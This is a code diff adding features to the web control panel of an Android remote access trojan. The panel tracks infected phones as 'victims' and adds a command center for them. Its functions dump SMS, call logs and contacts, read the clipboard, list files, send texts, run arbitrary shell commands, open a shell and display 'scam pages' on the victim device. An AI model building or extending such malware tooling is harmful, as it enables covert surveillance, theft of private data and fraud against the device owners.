@@ -118,6 +118,7 @@ function selectVictim(victimId) {
     if (currentVictim) {
         document.getElementById('phones').style.display = 'block';
         updateVictimInfo();
+        updateCommandCenter(); // Update command center visibility
 
         // Mark victim as selected
         document.querySelectorAll('.victim-item').forEach(item => {
@@ -257,11 +258,122 @@ async function sendCommand(commandType, parameters = {}) {
             parameters: parameters
         });
 
+        // Add to command history
+        addToCommandHistory(commandType, parameters, 'success');
+
         console.log('Command sent:', result.data);
-        showSuccess('Command sent successfully');
+        showSuccess(`Command "${commandType}" sent successfully`);
     } catch (error) {
         console.error('Error sending command:', error);
+        addToCommandHistory(commandType, parameters, 'error', error.message);
         showError('Failed to send command: ' + error.message);
+    }
+}
+
+// Quick command sender
+function sendQuickCommand(commandType) {
+    const commandParams = getCommandParameters(commandType);
+    sendCommand(commandType, commandParams);
+}
+
+// Get parameters for specific commands
+function getCommandParameters(commandType) {
+    switch (commandType) {
+        case 'send_sms':
+            const phone = prompt('Enter phone number:');
+            const message = prompt('Enter message:');
+            return phone && message ? { phone, message } : {};
+
+        case 'launch_url':
+            const url = prompt('Enter URL to launch:');
+            return url ? { url } : {};
+
+        case 'change_wallpaper':
+            const wallpaperUrl = prompt('Enter wallpaper URL:');
+            return wallpaperUrl ? { url: wallpaperUrl } : {};
+
+        case 'shell_command':
+            const shellCmd = prompt('Enter shell command:');
+            return shellCmd ? { command: shellCmd } : {};
+
+        default:
+            return {};
+    }
+}
+
+// Custom command sender
+async function sendCustomCommand() {
+    const cmdType = document.getElementById('custom-cmd-type').value;
+    const param = document.getElementById('custom-cmd-param').value.trim();
+    const extra = document.getElementById('custom-cmd-extra').value.trim();
+
+    if (!param) {
+        showError('Please enter command parameters');
+        return;
+    }
+
+    const parameters = { param };
+    if (extra) {
+        parameters.extra = extra;
+    }
+
+    await sendCommand(cmdType, parameters);
+
+    // Clear form
+    document.getElementById('custom-cmd-param').value = '';
+    document.getElementById('custom-cmd-extra').value = '';
+}
+
+// Command history management
+function addToCommandHistory(commandType, parameters, status, error = null) {
+    const logContainer = document.getElementById('command-log');
+    if (!logContainer) return;
+
+    const timestamp = new Date().toLocaleTimeString();
+    const paramStr = Object.keys(parameters).length > 0 ?
+        JSON.stringify(parameters) : 'none';
+
+    let logEntry = document.createElement('div');
+    logEntry.className = `log-entry ${status}`;
+
+    const statusIcon = status === 'success' ? '✅' :
+                      status === 'error' ? '❌' :
+                      status === 'warning' ? '⚠️' : 'ℹ️';
+
+    logEntry.innerHTML = `
+        <strong>${statusIcon} ${timestamp}</strong><br>
+        <span style="color: #00ff88;">Command:</span> ${commandType}<br>
+        <span style="color: #4444ff;">Params:</span> ${paramStr}
+        ${error ? `<br><span style="color: #ff4444;">Error:</span> ${error}` : ''}
+    `;
+
+    // Add to top of log
+    logContainer.insertBefore(logEntry, logContainer.firstChild);
+
+    // Limit log entries
+    while (logContainer.children.length > 50) {
+        logContainer.removeChild(logContainer.lastChild);
+    }
+}
+
+function clearCommandHistory() {
+    const logContainer = document.getElementById('command-log');
+    logContainer.innerHTML = '<div class="log-entry info">Command history cleared...</div>';
+}
+
+// Update command center visibility
+function updateCommandCenter() {
+    const commandCenter = document.getElementById('command-center');
+    const statusElement = document.getElementById('selected-victim-status');
+
+    if (currentVictim) {
+        commandCenter.classList.add('active');
+        statusElement.textContent = `Selected: ${currentVictim.device_name || 'Unknown Device'}`;
+        statusElement.style.color = '#00ff88';
+    } else {
+        commandCenter.classList.remove('active');
+        statusElement.textContent = 'No victim selected';
+        statusElement.style.color = '#ff4444';
     }
 }
 
@@ -395,7 +507,46 @@ function displayLogs() {
 
 // Export functions for global access
 window.selectVictim = selectVictim;
+// Expose functions to window object for HTML access
+window.selectVictim = selectVictim;
 window.sendCommand = sendCommand;
+window.sendQuickCommand = sendQuickCommand;
+window.sendCustomCommand = sendCustomCommand;
+window.clearCommandHistory = clearCommandHistory;
+window.backk = backk;
+
+// RAT Functions (enhanced versions)
+function dumpsms() {
+    sendCommand('dump_sms');
+}
+
+function calllogs() {
+    sendCommand('dump_call_logs');
+}
+
+function filesmanager() {
+    sendCommand('list_files');
+}
+
+function getpackages() {
+    sendCommand('get_installed_apps');
+}
+
+function deviceinfo() {
+    sendCommand('get_device_info');
+}
+
+function dumpcontact() {
+    sendCommand('dump_contacts');
+}
+
+function sendmsg() {
+    const phone = prompt('Enter phone number:');
+    const message = prompt('Enter message:');
+    if (phone && message) {
+        sendCommand('send_sms', { phone, message });
+    }
+}
 
 // RAT Functions (enhanced versions)
 function dumpsms() {
@@ -459,6 +610,34 @@ function micrec() {
 
 function showclip() {
     sendCommand('get_clipboard');
+}
+
+function toastt() {
+    const message = prompt('Enter toast message:');
+    if (message) {
+        sendCommand('show_toast', { message });
+    }
+}
+
+function startshell() {
+    sendCommand('start_shell');
+}
+
+function showphpag() {
+    sendCommand('show_scam_pages');
+}
+
+function backk(element) {
+    // Handle back navigation
+    const phonesDiv = document.getElementById('phones');
+    const usersDiv = document.getElementById('users');
+
+    if (phonesDiv.style.display === 'block') {
+        phonesDiv.style.display = 'none';
+        usersDiv.style.display = 'block';
+        currentVictim = null;
+        updateCommandCenter();
+    }
 }
 
 // Cleanup on page unload
